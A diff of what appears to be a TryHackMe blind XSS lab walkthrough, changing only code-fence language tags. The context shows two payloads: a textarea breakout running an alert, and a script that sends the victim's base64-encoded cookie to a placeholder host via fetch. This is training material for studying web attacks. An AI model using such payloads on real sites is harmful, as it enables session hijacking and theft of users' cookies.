@@ -53,7 +53,7 @@ https://THM_LAB_IP_ADDRESS.p.thmlabs.com
 
 - Try another new ticket with the following **[payload 2](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/12%20-%20Blind%20XSS%20Practical/Used%20Payloads/payload2.js)**:
   
-  ```
+  ```js
   </textarea><script>alert('THM');</script>
   ```
 
@@ -75,7 +75,7 @@ https://THM_LAB_IP_ADDRESS.p.thmlabs.com
   ![image](https://user-images.githubusercontent.com/63872951/187019471-bcd89f02-cf06-49ac-8171-63c5c60a3e4f.png)
   
 - Now that we've set up the method of receiving the exfiltrated information, let's build the [payload](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/12%20-%20Blind%20XSS%20Practical/Used%20Payloads/payload3.js).
-  ```
+  ```js
   </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
   ```
 
